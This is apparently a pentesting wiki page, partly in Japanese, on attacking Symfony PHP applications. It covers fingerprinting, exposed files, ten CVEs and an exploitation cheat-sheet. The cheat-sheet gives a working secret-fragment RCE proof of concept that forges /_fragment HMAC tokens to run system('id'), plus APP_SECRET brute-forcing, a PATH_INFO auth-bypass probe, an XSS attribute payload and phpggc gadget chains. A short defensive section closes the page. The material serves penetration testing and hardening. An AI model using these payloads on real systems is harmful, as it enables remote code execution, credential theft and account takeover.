# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony is one of the most widely-used PHP frameworks and regularly appears in assessments of enterprise, e-commerce and CMS targets (Drupal, Shopware, Ibexa, OroCRM … all embed Symfony components).  This page collects offensive tips, common mis-configurations and recent vulnerabilities you should have on your checklist when you discover a Symfony application.

> Historical note: A large part of the ecosystem still runs the **5.4 LTS** branch (EOL **November 2025**).  Symfony **7.4** became the new LTS in **Nov 2025** and will receive security fixes until **Nov 2029**.  Always verify the exact patch-level because many 2024‑2026 advisories were fixed only in micro releases.

---

## Recon & Enumeration

### Finger-printing
* HTTPレスポンスヘッダ: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` または `sf_redirect`、`sf_session`、`MOCKSESSID` で始まるクッキー。
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) は正確なバージョンを明らかにすることが多い:
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Symfony固有の公開ルート:
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (pretty error pages)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer、BuiltWith、または ffuf/feroxbuster の wordlists: `symfony.txt` → `/_fragment`、`/_profiler`、`.env`、`.htaccess` を探す。

### Interesting files & endpoints
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | 配備ミスが多い → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | Source disclosure → credentials + business logic |
| `/var/log/*.log`, `/log/dev.log` | Web-root mis-configuration により stack-traces が露出する |
| `/_profiler` | フルリクエスト履歴、構成、service container、**APP_SECRET** (≤ 3.4) |
| `/_fragment` | ESI/HInclude が使う entry point。`APP_SECRET` を知っていれば abuse 可能 |
| `/vendor/phpunit/phpunit/phpunit` | アクセス可能なら PHPUnit RCE (CVE-2017-9841) |
| `/index.php/_error/{code}` | フィンガープリントや例外トレースを時に漏らす |

---

## High-impact Vulnerabilities

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** が元だが、debug が有効なままにされていたり `.env` が露出しているモダンなターゲットでも *まだ*見つかる。
* 32文字の `APP_SECRET` を把握すると、HMAC トークンを作成して内部の `render()` コントローラを悪用し任意の Twig を実行できる:
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* Excellent write-up & exploitation script: Ambionics blog (linked in References).

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* 5.4.50 未満、6.4.29 未満、7.3.7 未満のバージョンに影響。Path の正規化で先頭の `/` が落ちることがあり、`/admin` 等を前提としたアクセス制御が壊れる。
* 簡易テスト: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → 認証なしで admin ルートに到達するなら該当。
* 修正は `symfony/http-foundation` またはフレームワーク全体を固定パッチレベルにアップグレードすること。

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* Windows 上で PHP が MSYS2（Git-Bash, mingw）から動作している場合に影響。5.4.51 未満、6.4.33 未満、7.3.11 未満、7.4.5 未満、8.0.5 未満で発生。`Process` が `=` を適切にエスケープしないためパスが壊れ、`rmdir` や `del` 等の破壊的コマンドが意図しないディレクトリを対象にする可能性がある。
* PHP スクリプトをアップロードできる、または Composer/CLI ヘルパーを介して `Process` を呼ばせられる場合、`=` を含む引数（例: `E:/=tmp/delete`）を使ってパスの書き換えを誘発できる。

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* `register_argv_argc=On` かつ非 SAPI ランタイムを使用している場合、細工したクエリ文字列で `argv` が解析され `APP_ENV`/`APP_DEBUG` を反転させられることがある。5.4.46 / 6.4.14 / 7.1.7 で修正済み。
* ログに `/?--env=prod` のようなものが受け入れられているか探す。

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* URI 中の特殊文字がブラウザと同じ方法で検証されておらず、攻撃者制御下ドメインへのリダイレクトが可能だった。5.4.46 / 6.4.14 / 7.1.7 で修正。

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` と `symfony/ux-live-component` の 2.25.1 未満で `{{ attributes }}` をエスケープせずレンダリングするため attribute injection / XSS が可能。アプリがコンポーネント属性をユーザ定義させている（管理CMS、メールテンプレート等）場合にスクリプト注入に繋げられる。
* 両パッケージを 2.25.1 以上に更新すること。手動での悪用例としては、カスタムコンポーネントに渡される属性値に JS を置き、レンダリングを引き起こす方法がある。

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* Process コンポーネントが Windows でカレントワーキングディレクトリを PATH より先に検索していた。書き込み可能な web-root に `tar.exe` や `cmd.exe` 等をアップロードし、`Process` をトリガー（例: ファイル展開、PDF生成）できればコマンド実行を得る。
* 5.4.50、6.4.14、7.1.7 で修正済み。

### 8. Session-Fixation – **CVE-2023-46733**
* Authentication guard がログイン後に既存の session ID を再利用していた。攻撃者が被害者の認証前に cookie をセットすると、ログイン後にアカウントを乗っ取れる。

### 9. Twig sandbox XSS – **CVE-2023-46734**
* ユーザ管理テンプレート（管理CMS、メールビルダ等）でユーザ制御のテンプレートを公開している場合、`nl2br` filter を悪用して sandbox を回避し JS を注入できる。

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id` は `sfNamespacedParameterHolder` などのクラスで unserialize() が行われると RCE を引き起こす Phar ペイロードを生成する。ファイルアップロードのエンドポイントや `phar://` ラッパーをチェックすること。

{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## Exploitation Cheat-Sheet

### Calculate HMAC token for `/_fragment`
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### 弱い `APP_SECRET` のブルートフォース攻撃
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### 公開された Symfony Console 経由の RCE
もし `bin/console` が `php-fpm` 経由または直接の CLI アップロードで到達可能な場合:
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
cache directory 内に deserialization gadgets を配置するか、次のリクエストで実行される悪意のある Twig テンプレートを作成する。

### PATH_INFO bypass を素早くプローブする (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
レンダリングされた出力が属性をエスケープせずにそのまま出力すると、XSSが成功します。2.25.1以上にパッチを当ててください。

---

## 防御ノート
1. **デバッグを本番環境にデプロイしてはいけません** (`APP_ENV=dev`, `APP_DEBUG=1`)。webサーバー設定で `/app_dev.php`, `/_profiler`, `/_wdt` をブロックしてください。  
2. 秘密は env vars または `vault/secrets.local.php` に保存し、*決して*ドキュメントルート経由でアクセス可能なファイルに置かないでください。  
3. パッチ管理を徹底してください — Symfony のセキュリティアドバイザリを購読し、少なくともLTSパッチレベルを維持してください（5.4.x は 2025年11月まで、6.4 は 2027年11月まで、7.4 は 2029年11月まで）。  
4. Windowsで運用している場合、CVE-2024-51736 および CVE-2026-24739 を緩和するために直ちにアップグレードするか、`open_basedir`/`disable_functions` による多層防御を追加してください。  

---

### 有用な攻撃用ツール
* **ambionics/symfony-exploits** – secret-fragment RCE、デバッガールートの検出。  
* **phpggc** – Symfony 1 & 2 向けの既製の gadget chains。  
* **sf-encoder** – `_fragment` の HMAC を計算する小さなヘルパー（Go実装）。

## 参考資料
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
